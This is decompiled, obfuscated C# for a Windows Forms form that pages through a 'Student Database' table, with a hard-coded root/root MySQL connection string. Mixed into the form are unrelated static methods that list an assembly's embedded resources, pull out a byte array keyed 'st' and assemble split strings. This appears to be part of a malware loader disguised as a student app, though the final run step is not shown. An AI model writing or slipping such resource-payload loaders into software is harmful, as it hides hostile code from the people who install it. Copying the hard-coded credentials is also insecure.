using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eo8;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Wi84;
using d4G;
using g7J;
using o8G9;

namespace b9NH;

[DesignerGenerated]
public class t9L5 : Form
{
	private DataGridView _DataGridView1;

	private Button _Button2;

	private Label _Label1;

	private Label _Label2;

	private Ms8 Command;

	private int Counter;

	private int No_Of_Rows;

	internal IContainer t;

	internal Button R;

	internal j6R I;

	internal int l;

	internal Tw3 p;

	internal DataTable q;

	internal BindingSource D;

	public t9L5()
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)i5GA);
		Tw3 tw = (p = new Tw3());
		DataTable dataTable = (q = new DataTable());
		BindingSource val = (D = new BindingSource());
		Wi92();
	}

	protected override void c5M3(bool Xq87)
	{
		try
		{
			if (Xq87 && t != null)
			{
				t.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Xq87);
		}
	}

	private void Wi92()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_01a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ac: Expected O, but got Unknown
		Zb60(new DataGridView());
		k1XE(new Button());
		a4ST(new Button());
		Ke7c(new Label());
		r3P7(new Label());
		((ISupportInitialize)r9M5()).BeginInit();
		((Control)this).SuspendLayout();
		r9M5().set_BackgroundColor(SystemColors.ButtonFace);
		r9M5().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)r9M5()).set_Location(new Point(30, 36));
		((Control)r9M5()).set_Name("DataGridView1");
		((Control)r9M5()).set_Size(new Size(527, 150));
		((Control)r9M5()).set_TabIndex(0);
		((Control)t7PG()).set_BackgroundImageLayout((ImageLayout)0);
		((Control)t7PG()).set_Location(new Point(30, 218));
		((Control)t7PG()).set_Name("Button1");
		((Control)t7PG()).set_Size(new Size(75, 23));
		((Control)t7PG()).set_TabIndex(1);
		((ButtonBase)t7PG()).set_Text("Previous");
		((ButtonBase)t7PG()).set_UseVisualStyleBackColor(true);
		((Control)c4EM()).set_Location(new Point(482, 213));
		((Control)c4EM()).set_Name("Button2");
		((Control)c4EM()).set_Size(new Size(75, 23));
		((Control)c4EM()).set_TabIndex(2);
		((ButtonBase)c4EM()).set_Text("Next");
		((ButtonBase)c4EM()).set_UseVisualStyleBackColor(true);
		q3EM().set_AutoSize(true);
		((Control)q3EM()).set_Font(new Font("Arial Rounded MT Bold", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)q3EM()).set_Location(new Point(203, 9));
		((Control)q3EM()).set_Name("Label1");
		((Control)q3EM()).set_Size(new Size(189, 24));
		((Control)q3EM()).set_TabIndex(3);
		q3EM().set_Text("Student Database");
		e2R9().set_AutoSize(true);
		((Control)e2R9()).set_Location(new Point(249, 218));
		((Control)e2R9()).set_Name("Label2");
		((Control)e2R9()).set_Size(new Size(39, 13));
		((Control)e2R9()).set_TabIndex(4);
		e2R9().set_Text("Label2");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(594, 253));
		((Control)this).get_Controls().Add((Control)(object)e2R9());
		((Control)this).get_Controls().Add((Control)(object)q3EM());
		((Control)this).get_Controls().Add((Control)(object)c4EM());
		((Control)this).get_Controls().Add((Control)(object)t7PG());
		((Control)this).get_Controls().Add((Control)(object)r9M5());
		((Control)this).set_Name("Form2");
		((Form)this).set_Text("Paged Display of Student Databse");
		((ISupportInitialize)r9M5()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual DataGridView r9M5()
	{
		return _DataGridView1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zb60(DataGridView a8JH)
	{
		_DataGridView1 = a8JH;
	}

	[SpecialName]
	internal virtual Button t7PG()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k1XE(Button Rn82)
	{
		EventHandler eventHandler = q2Z5;
		Button r = R;
		if (r != null)
		{
			((Control)r).remove_Click(eventHandler);
		}
		Button val = (R = Rn82);
		r = R;
		if (r != null)
		{
			((Control)r).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button c4EM()
	{
		return _Button2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a4ST(Button m1J8)
	{
		EventHandler eventHandler = Nr63;
		Button button = _Button2;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button2 = m1J8;
		button = _Button2;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label q3EM()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ke7c(Label n7GD)
	{
		_Label1 = n7GD;
	}

	[SpecialName]
	internal virtual Label e2R9()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r3P7(Label Te2q)
	{
		_Label2 = Te2q;
	}

	private void q2Z5(object sender, EventArgs e)
	{
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		r9M5().set_DataSource((object)null);
		r9M5().get_Rows().Clear();
		q.Clear();
		if (!((Control)c4EM()).get_Enabled())
		{
			((Control)c4EM()).set_Enabled(true);
		}
		checked
		{
			try
			{
				p.Wj1(Command);
				if (Counter - 5 >= 0)
				{
					p.Dk8();
					Counter -= 5;
				}
				else
				{
					p.Dk8();
					Counter = 0;
					Counter = 0;
				}
				int num = (l = q.Rows.Count);
				if (Counter <= 0)
				{
					Counter = 0;
					((Control)t7PG()).set_Enabled(false);
					((Control)c4EM()).set_Enabled(true);
				}
				int num2 = (l = q.Rows.Count);
				D.set_DataSource((object)q);
				r9M5().set_DataSource((object)D);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message);
				ProjectData.ClearProjectError();
			}
			finally
			{
				I.g5Z();
			}
			e2R9().set_Text("Page " + Conversions.ToString(Conversion.Int(Math.Round((double)Counter / 5.0) + 1.0)) + " of " + Conversions.ToString(Conversion.Int(Math.Ceiling((double)No_Of_Rows / 5.0))));
			r9M5().set_AutoSizeRowsMode((DataGridViewAutoSizeRowsMode)7);
			r9M5().set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)6);
		}
	}

	internal static byte[] r7QM(string[] Ex74, int Dq3r)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[Ex74.Length - 1 + 1];
				int num = Ex74.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = Ex74[i].Replace(".resources", "");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)p1RD.mDic["bee"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.CompareString(dictionaryEntry.Key.ToString(), "st", false) == 0)
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private void Nr63(object sender, EventArgs e)
	{
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		((Control)t7PG()).set_Enabled(true);
		r9M5().set_DataSource((object)null);
		r9M5().get_Rows().Clear();
		q.Clear();
		checked
		{
			try
			{
				p.Wj1(Command);
				Counter += l;
				p.Dk8();
				int num = (l = q.Rows.Count);
				if (Counter + l >= No_Of_Rows)
				{
					((Control)c4EM()).set_Enabled(false);
				}
				else
				{
					((Control)c4EM()).set_Enabled(true);
				}
				D.set_DataSource((object)q);
				r9M5().set_DataSource((object)D);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message);
				ProjectData.ClearProjectError();
			}
			finally
			{
				I.g5Z();
			}
			e2R9().set_Text("Page " + Conversions.ToString(Conversion.Int(Math.Round((double)Counter / 5.0) + 1.0)) + " of " + Conversions.ToString(Conversion.Int(Math.Ceiling((double)No_Of_Rows / 5.0))));
			r9M5().set_AutoSizeRowsMode((DataGridViewAutoSizeRowsMode)7);
			r9M5().set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)6);
		}
	}

	internal static void f3YH()
	{
		string[] bd3f = new string[8] { "X", "B", "Q", "=", "X", "R", "Q", "=" };
		string value = f2W9.Mm62(bd3f, 0, 3);
		string value2 = f2W9.Mm62(bd3f, 4, 7);
		p1RD.mDic.Add(p1RD.tName, value);
		p1RD.mDic.Add(p1RD.mName, value2);
	}

	private void i5GA(object sender, EventArgs e)
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
		((Control)t7PG()).set_Enabled(false);
		((Control)c4EM()).set_Enabled(true);
		Counter = 0;
		j6R j6R = (I = new j6R());
		I.Jq8("server=localhost;userid=root;password=root;database=student;");
		Tw3 tw = new Tw3();
		DataTable dataTable = new DataTable();
		BindingSource val = new BindingSource();
		try
		{
			I.f1N();
			Command = new Ms8();
			tw.Wj1(Command);
			tw.Gg4(dataTable);
			No_Of_Rows = dataTable.Rows.Count;
			if (dataTable.Rows.Count <= 5)
			{
				((Control)c4EM()).set_Enabled(false);
			}
			dataTable.Clear();
			tw.Dk8();
			Counter = 0;
			int num = (l = dataTable.Rows.Count);
			val.set_DataSource((object)dataTable);
			r9M5().set_DataSource((object)val);
			tw.Yr2(dataTable);
			I.Dt5();
			e2R9().set_Text("Page 1 of " + Conversions.ToString(Conversion.Int(Math.Ceiling((double)No_Of_Rows / 5.0))));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			I.g5Z();
		}
		r9M5().set_AutoSizeRowsMode((DataGridViewAutoSizeRowsMode)7);
		r9M5().set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)6);
	}

	internal static string[] d3N5()
	{
		List<string> list = new List<string>();
		int num = 0;
		string[] manifestResourceNames = ((Assembly)p1RD.mDic["bee"]).GetManifestResourceNames();
		foreach (string item in manifestResourceNames)
		{
			list.Add(item);
		}
		checked
		{
			string[] array = new string[list.Count - 1 + 1];
			int num2 = array.Length - 1;
			for (num = 0; num <= num2; num++)
			{
				array[num] = list[num];
			}
			return array;
		}
	}
}
